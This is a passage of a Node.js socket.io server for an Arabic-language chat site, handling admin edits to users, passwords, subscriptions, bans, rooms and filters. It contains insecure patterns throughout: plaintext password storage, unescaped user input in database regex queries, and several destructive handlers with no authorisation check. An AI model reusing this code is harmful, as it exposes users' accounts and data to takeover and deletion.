                        user_list.findOne({ id: data.id }, function (err, isid) {
                            if (err) throw err;
                            if (isid) {
                                const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                                const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                                if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                    user_list.updateOne({ id: data.id }, UpdateUser, function (err, uruser) {
                                        if (err) throw err;
                                        if (uruser) {
                                            socket.emit("savedone", "تم حفظ اعجابات العضو");

                                            user_list.findOne({ token: data.token }, function (err, isaves) {
                                                if (err) throw err;
                                                if (isaves) {
                                                    savestate({ state: "تعديل اعجاب", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                                }
                                            });
                                        }
                                    });
                                } else {
                                    socket.emit("savedone", "لا يمكنك التعديل على رتبة اعلى منك");
                                }
                            }
                        });
                    }
                });
            } else {
                socket.emit("savedone", "تاكد من صحة البيانات المدخلة");
            }
        } else if (data.state == 3) {
            if (data.pass.length >= 4) {
                var UpdateUsers = {
                    $set: {
                        password: data.pass,
                    },
                };

                user_list.findOne({ token: data.token }, function (err, istoken) {
                    if (err) throw err;
                    if (istoken) {
                        user_list.findOne({ id: data.id }, function (err, isid) {
                            if (err) throw err;
                            if (isid) {
                                const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                                const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                                if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                    user_list.updateOne({ id: data.id }, UpdateUsers, function (err, uruser) {
                                        if (err) throw err;
                                        if (uruser) {
                                            socket.emit("savedone", "تم تعديل كلمة السر");
                                            user_list.findOne({ token: data.token }, function (err, isaves) {
                                                if (err) throw err;
                                                if (isaves) {
                                                    user_list.findOne({ id: data.id }, function (err, isuser) {
                                                        if (err) throw err;
                                                        if (isuser) {
                                                            savestate({ state: "تعديل كلمة مرور", topic: isaves.topic, topic1: isuser.topic1, room: "", time: new Date().getTime() });
                                                        }
                                                    });
                                                }
                                            });
                                        }
                                    });
                                } else {
                                    socket.emit("savedone", "لا يمكنك التعديل على رتبة اعلى منك");
                                }
                            }
                        });
                    }
                });
            } else {
                socket.emit("savedone", "تاكد من صحة البيانات المدخلة");
            }
        } else if (data.state == 4) {
            var UpdateUse = {
                $set: {
                    documentationc: JSON.parse(data.best)["documentation"],
                    loginG: JSON.parse(data.best)["loginG"],
                },
            };
            user_list.findOne({ token: data.token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    user_list.findOne({ id: data.id }, function (err, isid) {
                        if (err) throw err;
                        if (isid) {
                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                user_list.updateOne({ id: data.id }, UpdateUse, function (err, uruser) {
                                    if (err) throw err;
                                    if (uruser) {
                                        socket.emit("savedone", "تم حفظ الاعدادات");
                                        user_list.findOne({ token: data.token }, function (err, isaves) {
                                            if (err) throw err;
                                            if (isaves) {
                                                savestate({ state: "تعديل عضويه", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                            }
                                        });
                                    }
                                });
                            } else {
                                socket.emit("savedone", "لا يمكنك التعديل على رتبة اعلى منك");
                            }
                        }
                    });
                }
            });
        } else if (data.state == 5) {
 user_list.findOne({ token: data.token }, function (err, istoken) {
                                if (err) throw err;
                                if (istoken) {
                                    user_list.findOne({ id: data.id }, function (err, isid) {
                                        if (err) throw err;
                                        if (isid) {
                                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
            var UpdateUse = {
                $set: {
                    power: data.power,
                },
            };
            user_list.updateOne({ id: data.id }, UpdateUse, function (err, uruser) {
                if (err) throw err;
                if (uruser) {
                    subscriptions_list.findOne({ iduser: data.id }, function (err, issub) {
                        if (err) throw err;
                        if (issub) {
                            if (data.day == 0) {
                                var isurt = "دائم";
                            } else {
                                var isurt = data.day;
                            }
                            var isub = {
                                $set: {
                                    sub: data.power,
                                    time: data.day,
                                    timeis: isurt,
                                },
                            };

                                                subscriptions_list.updateOne({ iduser: data.id }, isub, function (err, isus) {
                                                    if (err) throw err;
                                                    if (isus) {
                                                        socket.emit("savedone", "تم تعديل الاشتراك");
                                                        user_list.findOne({ token: data.token }, function (err, isaves) {
                                                            if (err) throw err;
                                                            if (isaves) {
                                                                savestate({ state: "تعديل إشتراك", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                                            }
                                                        });
                                                    }
                                                });

                              
                        } else {
                            user_list.findOne({ id: data.id }, function (err, isuser) {
                                if (err) throw err;
                                if (isuser) {
                                    var save_sub = new subscriptions_list();
                                    save_sub.iduser = data.id;
                                    save_sub.sub = data.power;
                                    save_sub.topic = isuser.topic;
                                    save_sub.topic1 = isuser.topic1;
                                    save_sub.time = data.day;
                                    if (data.day == 0) {
                                        save_sub.timeis = "دائم";
                                    } else {
                                        save_sub.timeis = data.day;
                                    }
                                    save_sub.save(function (err, save_not) {
                                        if (err) throw err;
                                        if (save_not) {
                                            socket.emit("savedone", "تم إضافة اشتارك");
                                            user_list.findOne({ token: data.token }, function (err, isaves) {
                                                if (err) throw err;
                                                if (isaves) {
                                                    savestate({ state: "إضافة إشتراك", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            });
			              } else {
                                                socket.emit("savedone", "لا يمكنك التعديل على رتبة اعلى منك");
                                            }
                                        }
                                    });
                                }
                            });
        } else if (data.state == 6) {
            band_list.findOne({ _id: data.id }, function (err, res1) {
                if (err) throw err;
                if (res1) {
                    band_list.deleteOne({ _id: data.id }, function (err, res) {
                        if (err) throw err;
                        if (res) {
                            socket.emit("savedone", "تم فك الحظر");
                            user_list.findOne({ token: data.token }, function (err, isaves) {
                                if (err) throw err;
                                if (isaves) {
                                    savestate({ state: "فك الحظر", topic: isaves.topic, topic1: res1.device_band || res1.ip_band, room: "", time: new Date().getTime() });
                                }
                            });
                        }
                    });
                }
            });
        } else if (data.state == 7) {
            subscriptions_list.deleteOne({ iduser: data.id }, function (err, res) {
                if (err) throw err;
                if (res) {
                    var UpdateUseaa = {
                        $set: {
                            power: "",
                        },
                    };
                    user_list.updateOne({ id: data.id }, UpdateUseaa, function (err, uruser) {
                        if (err) throw err;
                        if (uruser) {
                            socket.emit("savedone", "تم مسح الاشتراك");
                            user_list.findOne({ token: data.token }, function (err, isaves) {
                                if (err) throw err;
                                if (isaves) {
                                    savestate({ state: "مسح إشتراك", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                }
                            });
                        }
                    });
                }
            });
        } else if (data.state == 8) {
            messages_list.deleteOne({ _id: data.id }, function (err, res) {
                if (err) throw err;
                if (res) {
                    socket.emit("savedone", "تم مسح الرسائل.");
                    user_list.findOne({ token: data.token }, function (err, isaves) {
                        if (err) throw err;
                        if (isaves) {
                            savestate({ state: "مسح رسائل الترحيب", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                        }
                    });
                }
            });
        } else if (data.state == 9) {
            zak_list.deleteOne({ _id: data.id }, function (err, res) {
                if (err) throw err;
                if (res) {
                    // socket.emit('savedone','تم مسح الرسائل.');
                }
            });
        } else if (data.state == 10) {
            var UpdateUseaa = {
                $set: {
                    pic: "room.png",
                },
            };
            room_list.updateOne({ id: data.id }, UpdateUseaa, function (err, romud) {
                if (err) throw err;
                if (romud) {
                    // socket.emit('savedone','تم مسح الرسائل.');
                }
            });
        } else if (data.state == 11) {
            var UpdateUseaa = {
                $set: {
                    pass: "",
                    needpass: false,
                },
            };
            room_list.updateOne({ id: data.id }, UpdateUseaa, function (err, romud) {
                if (err) throw err;
                if (romud) {
                    socket.emit("savedone", "تم مسح كلمة مرور الغرفة");
                    user_list.findOne({ token: data.token }, function (err, isaves) {
                        if (err) throw err;
                        if (isaves) {
                            savestate({ state: "مسح كلمة مرور غرفة", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                        }
                    });
                }
            });
        } else if (data.state == 12) {
            if (data.id != "efOiAhhNdL") {
                room_list.deleteOne({ id: data.id }, function (err, res) {
                    if (err) throw err;
                    if (res) {
                        // socket.emit('savedone','تم مسح الرسائل.');
                        user_list.findOne({ token: data.token }, function (err, isaves) {
                            if (err) throw err;
                            if (isaves) {
                                io.emit("msg", { cmd: "r-", data: data.id });
                                io.to(data.id).emit("msg", {
                                    cmd: "lavedon",
                                    data: {},
                                });
                                savestate({ state: "مسح غرفة", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                            }
                        });
                    }
                });
            }
        }
    });

    socket.on("setinfolog", function (data) {
        log_list.find({ $or: [{ topic: { $regex: data + ".*", $options: "i" } }, { ip: { $regex: data + ".*", $options: "i" } }] }, function (err, log) {
            if (err) throw err;
            if (log) {
                socket.emit("getinfolog", new Date().getTime(), log);
            }
        });
    });

    socket.on("setuseraccount", function (data) {
        user_list
            .find({ $or: [{ topic: { $regex: data + ".*", $options: "i" } }, { ip: { $regex: data + ".*", $options: "i" } }] }, function (err, acc) {
                if (err) throw err;
                if (acc) {
                    socket.emit("getuseraccount", new Date().getTime(), acc);
                }
            })
            .select("-password")
            .select("-bg")
            .select("-co")
            .select("-idreg")
            .select("-lid")
            .select("-mcol")
            .select("-msg")
            .select("-stat")
            .select("-ucol")
            .select("-token")
            .select("-_id")
            .select("-__v");
    });

    socket.on("setinfostate", function () {
        states_list.find({}, function (err, state) {
            if (err) throw err;
            if (state) {
                socket.emit("getinfostate", new Date().getTime(), state);
            }
        });
    });

    socket.on("setrooms", function () {
        room_list
            .find({}, function (err, room) {
                if (err) throw err;
                if (room) {
                    socket.emit("getrooms", room);
                }
            })
            .select("-_id")
            .select("-v");
    });

    socket.on("addzakrfa", function (data) {
        if (data) {
            var msg_save = new zak_list();
            msg_save.text1 = data.name;
            msg_save.text2 = data.value;
            msg_save.save(function (err, save_zak) {
                if (err) throw err;
                if (save_zak) {
                    socket.emit("zakad", { id: save_zak._id, name: save_zak.text1, value: save_zak.text2 });
                }
            });
        }
    });

    socket.on("setektisar", function () {
        zak_list.find({}, function (err, zak) {
            if (err) throw err;
            if (zak) {
                socket.emit("getektisar", zak);
            }
        });
    });

    socket.on("addnewmsg", function (data) {
        if (data) {
            var msg_save = new messages_list();
            msg_save.category = data.type;
            msg_save.adresse = data.t;
            msg_save.msg = data.m;
            msg_save.save(function (err, save_msg) {
                if (err) throw err;
                if (save_msg) {
                    socket.emit("msgx", { id: save_msg._id, type: save_msg.category, t: save_msg.adresse, m: save_msg.msg });
                }
            });
        }
    });

    socket.on("isband", function (data) {
        if (data && UserInfo[socket.id]) {
			if(UserInfo[socket.id].documents == 0){
            io.to(data).emit("msg", {
                cmd: "not",
                data: {
                    topic: UserInfo[socket.id].username,
                    msg: "تم حظرك من الدردشة",
                    user: socket.id,
                    force: 0,
                    nonot: true,
                },
            });
            io.to(data).emit("msg", {
                cmd: "kicked",
                data: {},
            });

            if (UserInfo[data]) {
                io.to(UserInfo[socket.id].idroom).emit("msg", {
                    cmd: "msg",
                    data: {
                        bg: "none",
                        class: "hmsg",
                        topic: UserInfo[data].username,
                        msg: "( هذا المستخدم تم حظره من الدردشة )",
                        roomid: UserInfo[data].idroom,
                        pic: UserInfo[data].pic,
                        uid: data,
                    },
                });
            }

            var save_band = new band_list();
            save_band.device_band = UserInfo[data].fp;
            save_band.ip_band = UserInfo[data].ip;
            save_band.date_band = new Date();
            (save_band.name_band = UserInfo[data].username), (save_band.type = "system1");
            save_band.date_end = DateMonth;
            save_band.save(function (err, save_van) {
                if (err) throw err;
                if (save_van) {
                }
            });
        }
		};
    });

    socket.on("addnewwire", function (data) {
        if (data) {
            var msgw_save = new noletters_list();
            if (data.path == "bmsgs") {
                msgw_save.type = "إضافة كلمة ممنوعه الى الفلتر";
            } else if (data.path == "amsgs") {
                msgw_save.type = "إضافة كلمة مسموحة الى الفلتر";
            } else if (data.path == "wmsgs") {
                msgw_save.type = "إضافة كلمة مراقبه الى الفلتر";
            }
            msgw_save.path = data.path;
            msgw_save.v = data.v;
            msgw_save.save(function (err, save_msg) {
                if (err) throw err;
                if (save_msg) {
                    socket.emit("savenor", { id: save_msg._id, type: save_msg.type, path: save_msg.path, v: save_msg.v });
                }
            });
        }
    });

    socket.on("msgall", function () {
        messages_list.find({}, function (err, state) {
            if (err) throw err;
            if (state) {
                socket.emit("getmsgall", state);
            }
        });
    });

    socket.on("listband", function () {
	bans_list.findOne({ _id: "5fc3b0fbed6d071214a4f999" }, function (err, sres) {
if (err) throw err;
if(sres){
	socket.emit('refreshband',{system:sres.systems,browser:sres.browsers});
}
});
        band_list.find({}, function (err, band) {
            if (err) throw err;
            if (band) {
                socket.emit("getlistband", band);
            }
        });
    });

    setting_list.find({}, function (err, st) {
        if (err) throw err;
        if (st) {
            emos = st[0].emo;
            dro3s = st[0].dro3;
            sicos = st[0].sico;
            siteweb = st[0].site;

            socket.emit("setting_site", {
                bg: siteweb["bg"],
                buttons: siteweb["buttons"],
                background: siteweb["background"],
                name: siteweb["name"],
                js: siteweb["siteScript"],
                keyb: siteweb["sitekeywords"],
                title: siteweb["title"],
                description: siteweb["sitedescription"],
            });
        }
    });

    socket.on("getSettingSite", function () {
        setting_list.find({}, function (err, st) {
            if (err) throw err;
            if (st) {
                socket.emit("setSettingSite", st[0]);
            }
        });
    });

    socket.on("updateImgIco", function (data) {
        if (data) {
            if (data.state == 1) {
                var querya = { $push: { sico: data.data } };
            } else if (data.state == 2) {
                var querya = { $push: { dro3: data.data } };
            } else if (data.state == 3) {
                var querya = { $push: { emo: data.data } };
            }

            setting_list.updateOne({ _id: "5fc3b0fbed6d071214a4f009" }, querya, function (err, res) {
                if (err) throw err;
                if (res) {
                }
            });
        }
    });

    socket.on("deletefilter", function (data) {
		if(data){
		histroys_noltter.deleteOne({ _id: data.id}, function (err, res) {
		if (err) throw err;
		if (res) {
            socket.emit("savedone", "تم مسح الفيلتر");
		}
		});
		}
	});
	
	
    socket.on("getnoletter", function () {
        noletters_list.find({}, function (err, st) {
            if (err) throw err;
            if (st) {
                socket.emit("setnoletter", st);
            }
        });

        histroys_noltter.find({}, function (err, ht) {
            if (err) throw err;
            if (ht) {
                socket.emit("sethisyroy", ht);
            }
        });
    });

    socket.on("getsubslist", function () {
        subscriptions_list.find({}, function (err, sub) {
            if (err) throw err;
            if (sub) {
                power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, data) {
                    if (err) throw err;
                    if (data) {
                        socket.emit("subslist", data["powers"], sub);
                    }
                });
            }
        });
    });

    socket.on("register", function (data) {
        if (siteweb["allowreg"]) {
            socket.emit("msg", { cmd: "removede", data: {} });
            socket.emit("msg", {
                cmd: "not",
                data: {
                    topic: "",
                    msg: "لا يمكنك تسجيل عضوية حاليا",
                    user: "",
                    force: 0,
                    nonot: true,
                },
            });
        } else {
            if (data.username.length >= siteweb["walllikes"].lengthUserReg) {
                socket.emit("msg", { cmd: "removede", data: {} });

                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن 50 حرف",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                if (data) {
                    user_list.findOne({ topic: data.username.trim() }, function (err, user) {
                        if (err) throw err;
                        if (user) {
                            socket.emit("msg", { cmd: "error_list", data: { color: "danger", msg: "هذا المستخدم مسجل من قبل" } });
                        } else {
                            user_list.find({}, function (err, isuser) {
                                if (err) throw err;
                                if (isuser) {
                                    var save_user = new user_list();
                                    save_user.co = data.co;
                                    save_user.fp = data.fp;
                                    save_user.ip = data.ip;
                                    save_user.password = data.password;
                                    save_user.id = stringGen(15);
                                    save_user.idreg = "#" + isuser.length + 1;
                                    save_user.lid = stringGen(31);
                                    save_user.topic = data.username.trim();
                                    save_user.topic1 = data.username.trim();
                                    save_user.token = data.token;
                                    save_user.save(function (err, save_users) {
                                        if (err) throw err;
                                        if (save_users) {
                                            socket.emit("msg", { cmd: "error_list", data: { color: "success", msg: "تم تسجيل العضويه بنجاح !" } });
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            }
        }
    });

    function getname(data) {
        const indexroom = roomslists.findIndex((x) => x.id == data);
        return roomslists[indexroom].topic;
    }

    //DisconnectUser
    socket.on("disconnect", function () {
        var userData = UserInfo[socket.id];
        if (typeof userData !== "undefined") {
            if (UserInfo[socket.id].powers["stealth"] == 1 && UserInfo[socket.id].stealth == true) {
            } else {
                io.to(userData.idroom).emit("msg", {
                    cmd: "msg",
                    data: {
                        bg: "none",
                        class: "hmsg",
                        topic: userData.username,
                        msg: "( هذا المستخدم غادر الدردشة)",
                        roomid: userData.idroom,
                        pic: userData.pic,
                    },
                });
            }
            if (UserInfo[socket.id].uid) {
                var UpdateUser = {
                    $set: {
                        lastssen: new Date().getTime(),
                        token: stringGen(177),
                    },
                };

                user_list.updateOne({ id: UserInfo[socket.id].uid }, UpdateUser, function (err, uruser) {
                    if (err) throw err;
                    if (uruser) {
                    }
                });
            }
            io.emit("msg", { cmd: "ur", data: [userData.id, null] });
            socket.leave(userData.idroom);
        }
        delete UserInfo[socket.id];

        const indexw = online.findIndex((x) => x.id == socket.id);
        if (indexw != -1) {
            online.splice(
                online.findIndex((v) => v.id == socket.id),
                1
            );
            io.emit("msg", { cmd: "u-", data: socket.id });
        }

        var index = UserEntre.findIndex((x) => x == socket.id);
        if (index != -1) {
            UserEntre.splice(UserEntre.indexOf(socket.id), 1);
        }

        lastssen: new Date().getTime();
    });

    //OnlineUser
    // socket.emit("msg",{cmd:'server',data:{online:UserEntre.length}});

socket.on('BandSystem',function(data){
if(data){
if(data.type == 'system'){
user_list.findOne({ token: data.token }, function (err, istoken) {
if (err) throw err;
if (istoken) {
socket.emit("savedone", "تم التعديل على حظر الانظامة");
 savestate({ state: "تعديل حظر", topic: istoken.topic, topic1: 'تعديل حظر الانظمة', room: "", time: new Date().getTime() });
}
});
var isqu = {
$set: {systems: data.state},
};
}else if(data.type == 'browser'){
user_list.findOne({ token: data.token }, function (err, istoken) {
if (err) throw err;
if (istoken) {
socket.emit("savedone", "تم التعديل على حظر المتصفحات");
 savestate({ state: "تعديل حظر", topic: istoken.topic, topic1: 'تعديل حظر المتصفحات', room: "", time: new Date().getTime() });
};
})
var isqu = {
$set: {browsers: data.state},
};
};
bans_list.updateOne({ _id: "5fc3b0fbed6d071214a4f999" }, isqu, function (err, res) {
if (err) throw err;
if (res) {
bans_list.findOne({ _id: "5fc3b0fbed6d071214a4f999" }, function (err, sres) {
if (err) throw err;
if(sres){
 socket.emit('refreshband',{system:sres.systems,browser:sres.browsers});
}
});
}
});
};
});


    socket.on("msg", function (data) {
        // console.log(data);
        if (data.cmd == "msga") {
        } else if (data.cmd == "r-") {
            if (data.data["id"] != "efOiAhhNdL") {
                room_list.deleteOne({ id: data.data["id"] }, function (err, res) {
                    if (err) throw err;
                    if (res) {
                        io.emit("msg", { cmd: "r-", data: data.data["id"] });
                        io.to(data.data["id"]).emit("msg", {
                            cmd: "lavedon",
                            data: {},
                        });
                    }
                });
            }
        } else if (data.cmd == "busy") {
            if (data.data["busy"] == true) {
                ChangeSatets(2);
                setTimeout(function () {
                    UserInfo[socket.id].busy = true;
                }, 1000);
            } else {
                UserInfo[socket.id].busy = false;
                ChangeSatets(0);
            }
        } else if (data.cmd == "alerts") {
            if (data.data["alerts"] == true) {
                UserInfo[socket.id].alerts = true;
            } else {
                UserInfo[socket.id].alerts = false;
            }
        } else if (data.cmd == "r^") {
            if (data.data["pass"].length > 0) {
                var UpdateUdseaa = {
                    $set: {
                        topic: data.data["topic"],
                        about: data.data["about"],
                        welcome: data.data["welcome"],
                        pass: data.data["pass"],
                        needpass: true,
                        max: data.data["max"],
                    },
                };
            } else {
                var UpdateUdseaa = {
                    $set: {
                        topic: data.data["topic"],
                        about: data.data["about"],
                        welcome: data.data["welcome"],
                        pass: data.data["pass"],
                        needpass: false,
                        max: data.data["max"],
                    },
                };
            }
            room_list.updateOne({ id: data.data["id"] }, UpdateUdseaa, function (err, romud) {
                if (err) throw err;
                if (romud) {
                    room_list.findOne({ id: data.data["id"] }, function (err, isro) {
                        if (err) throw err;
                        if (isro) {
                            io.emit("msg", {
                                cmd: "r^",
                                data: {
                                    id: data.data["id"],
                                    topic: data.data["topic"],
                                    delete: isro.delete,
                                    needpass: isro.needpass,
                                    owner: isro.owner,
                                    pic: isro.pic,
                                    user: isro.user,
                                    about: data.data["about"],
                                    welcome: data.data["welcome"],
                                    max: data.data["max"],
                                },
                            });
                        }
                    });
                }
            });
        } else if (data.cmd == "likebc") {
            bar_list.findOne({ bid: data.data.bid, likes: UserInfo[socket.id].idreg }, function (err, islikea) {
                if (err) throw err;
                if (islikea) {
                } else {
                    var updatelikes = { $push: { likes: [UserInfo[socket.id].idreg] } };
                    bar_list.updateOne({ bid: data.data.bid }, updatelikes, function (err, islike) {
                        if (err) throw err;
                        if (islike) {
                            bar_list.findOne({ bid: data.data.bid }, function (err, islikea) {
                                if (err) throw err;
                                if (islikea) {
                                    io.emit("msg", { cmd: "bc^", data: { bid: data.data.bid, likes: islikea.likes.length } });
                                }
                            });
                        }
                    });
                }
            });
        } else if (data.cmd == "sco") {
            var updatecomment = { $push: { bcc: { bid: data.data.bid, pic: UserInfo[socket.id].pic, topic: UserInfo[socket.id].username, pccus: data.data.c.slice(0, 100) } } };
            bar_list.updateOne({ bid: data.data.bid }, updatecomment, function (err, iscomm) {
                if (err) throw err;
                if (iscomm) {
                    bar_list.findOne({ bid: data.data.bid }, function (err, isiscomms) {
                        if (err) throw err;
                        if (isiscomms) {
                            io.emit("msg", { cmd: "bcco", data: { bid: data.data.bid, pic: UserInfo[socket.id].pic, topic: UserInfo[socket.id].username, pccus: data.data.c.slice(0, 100) } });
                        }
                    });
                }
            });
        } else if (data.cmd == "delbc") {
            bar_list.deleteOne({ bid: data.data.bid }, function (err, res) {
                if (err) throw err;
                if (res) {
                    io.emit("msg", { cmd: "delbc", data: { bid: data.data.bid } });
                }
            });
        } else if (data.cmd == "r+") {
            if (UserInfo[socket.id].rep >= 3000) {
                room_list.findOne({ topic: data.data["topic"] }, function (err, rominfo) {
                    if (err) throw err;
                    if (rominfo) {
                        socket.emit("msg", {
                            cmd: "not",
                            data: {
                                topic: "",
                                msg: "يوجد غرفة تحمل نفس الاسم",
                                user: "",
                                force: 0,
                                nonot: true,
                            },
                        });
                    } else {
                        power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, ispower) {
                            if (err) throw err;
                            if (data) {
                                const indexroodam = ispower["powers"].findIndex((x) => x.name == UserInfo[socket.id].rank);
                                if (indexroodam == -1) {
                                    socket.emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: "",
                                            msg: "لا  تملك صلاحيه انشاء غرف",
                                            user: "",
                                            force: 0,
                                            nonot: true,
                                        },
                                    });
                                } else {
                                    if (ispower["powers"][indexroodam].createroom == 0) {
                                        socket.emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: "",
                                                msg: "لا  تملك صلاحيه انشاء غرف",
                                                user: "",
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                    } else {
                                        if (data.data["max"] <= 40 && data.data["max"] >= 2) {
                                            var save_room = new room_list();
                                            save_room.about = data.data["about"];
                                            save_room.user = UserInfo[socket.id].username;
                                            save_room.delete = false;
                                            save_room.id = stringGen(10);
                                            save_room.max = data.data["max"];
                                            save_room.pass = data.data["pass"];
                                            if (data.data["pass"]) {
                                                save_room.needpass = true;
                                            } else {
                                                save_room.needpass = false;
                                            }
                                            save_room.owner = UserInfo[socket.id].idreg;
                                            save_room.topic = data.data["topic"];
                                            save_room.welcome = data.data["welcome"];
                                            save_room.pic = "room.png";
                                            save_room.save(function (err, saveroom) {
                                                if (err) throw err;
                                                if (saveroom) {
                                                    room_list
                                                        .find({}, function (err, room) {
                                                            if (err) throw err;
                                                            if (room) {
                                                                roomslists = room;
                                                                io.emit("msg", { cmd: "r+", data: saveroom });
                                                                socket.emit("msg", {
                                                                    cmd: "gotorom",
                                                                    data: {
                                                                        id: saveroom.id,
                                                                    },
                                                                });
                                                            }
                                                        })
                                                        .select("-_id")
                                                        .select("-v");
                                                }
                                            });
                                        } else {
                                            socket.emit("msg", {
                                                cmd: "not",
                                                data: {
                                                    topic: "يجب ان يكون عدداعظاء الروم لا يزيد عن 40 او اقل من 2",
                                                    msg: "",
                                                    user: "",
                                                    force: 0,
                                                    nonot: true,
                                                },
                                            });
                                        }
                                    }
                                }
                            }
                        });
                    }
                });
            } else {
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "يجك ان يكون عدد اللايكات 3000",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            }
        } else if (data.cmd == "setprofile") {
            if (data.data["topic"].length >= 150) {
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن 150 حرف",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                if (UserInfo[socket.id]) {
                    UserInfo[socket.id].username = data.data["topic"];
                    UserInfo[socket.id].ucol = data.data["ucol"];
                    UserInfo[socket.id].mcol = data.data["mcol"];
                    UserInfo[socket.id].bg = data.data["bg"];
                    UserInfo[socket.id].pic = data.data["pic"];

                    const indexa = online.findIndex((x) => x.id == socket.id);
                    if (indexa != -1) {
                        online[indexa].bg = data.data["bg"];
                        online[indexa].ucol = data.data["ucol"];
                        online[indexa].topic1 = data.data["topic"];
                        online[indexa].mcol = data.data["mcol"];
                        online[indexa].pic = data.data["pic"];
                        online[indexa].msg = data.data["msg"];
                        io.emit("msg", { cmd: "u^", data: online[indexa] });
                    }

                    if (UserInfo[socket.id].uid) {
                        var UpdateUser = {
                            $set: {
                                bg: data.data["bg"],
                                ucol: data.data["ucol"],
                                topic1: data.data["topic"],
                                mcol: data.data["mcol"],
                                pic: data.data["pic"],
                                msg: data.data["msg"],
                            },
                        };

                        user_list.updateOne({ id: UserInfo[socket.id].uid }, UpdateUser, function (err, uruser) {
                            if (err) throw err;
                            if (uruser) {
                            }
                        });
                    }
                }
            }
        } else if (data.cmd == "unick") {
            if (data.data["nick"].length >= 50) {
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن 50 حرف",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                io.to(data.data["id"]).emit("msg", {
                    cmd: "not",
                    data: {
                        topic: UserInfo[socket.id].username,
                        msg: " تم تغير اسمك الى" + data.data["nick"],
                        user: socket.id,
                        force: 0,
                        nonot: true,
                    },
                });

                const inme = online.findIndex((x) => x.id == data.data["id"]);
                if (inme != -1) {
                    online[inme].topic1 = data.data["nick"];
                    UserInfo[data.data["id"]].username = data.data["nick"];
                    io.emit("msg", { cmd: "u^", data: online[inme] });
                }

                if (UserInfo[data.data["id"]].uid) {
                    var UpdateUser = {
                        $set: {
                            topic1: data.data["nick"],
                        },
                    };

                    const indexr1 = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                    savestate({ state: "تعديل زخرفة", topic: UserInfo[socket.id].username, topic1: UserInfo[data.data["id"]].username, room: roomslists[indexr1].topic, time: new Date().getTime() });

                    user_list.updateOne({ id: UserInfo[data.data["id"]].uid }, UpdateUser, function (err, uruser) {
                        if (err) throw err;
                        if (uruser) {
                        }
                    });
                }
            }
        } else if (data.cmd == "ulikeins") {
            io.to(data.data["id"]).emit("msg", {
                cmd: "not",
                data: {
                    topic: UserInfo[socket.id].username,
                    msg: " تم تغير إعجاباتك الى ↵ " + data.data["like"],
                    user: socket.id,
                    force: 0,
                    nonot: true,
                },
            });
            if (UserInfo[socket.id]) {
                const rokda2 = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                savestate({ state: "تعديل اعجابات", topic: UserInfo[socket.id].username, topic1: UserInfo[data.data["id"]].username, room: roomslists[rokda2].topic, time: new Date().getTime() });
            }
            const indexa = online.findIndex((x) => x.id == data.data["id"]);
            if (indexa != -1) {
                online[indexa].rep = data.data["like"];
                UserInfo[data.data["id"]].rep = data.data["like"];
                io.emit("msg", { cmd: "u^", data: online[indexa] });
            }

            if (UserInfo[data.data["id"]].uid) {
                var UpdateUser = {
                    $set: {
                        rep: data.data["like"],
                    },
                };

                user_list.updateOne({ id: UserInfo[data.data["id"]].uid }, UpdateUser, function (err, uruser) {
                    if (err) throw err;
                    if (uruser) {
                    }
                });
            }
			
			
        } else if (data.cmd == "addGrMsg") {
            if (data.data["cmd"] == "removUsers") {
                var rr = JSON.parse(data.data["data"]);
                const rmgr = GroupUsers.findIndex((x) => x.id == rr["gid"]);
				if(rmgr != -1){
                socket.to(rr["id"]).emit("msg", { cmd: "addGrMsg", data: { cmd: "clos", data: rr["gid"] } });
    socket.to(rr["id"]).emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "تم طردك من المحادثه",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });  
  for (var i = 0; i < GroupUsers[rmgr].users.length; i++) {
io.to(GroupUsers[rmgr].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "u-",
                            gid: rr["gid"],
                            us: rr["id"],
                        },
                });
				
				if(UserInfo[rr["id"]]){
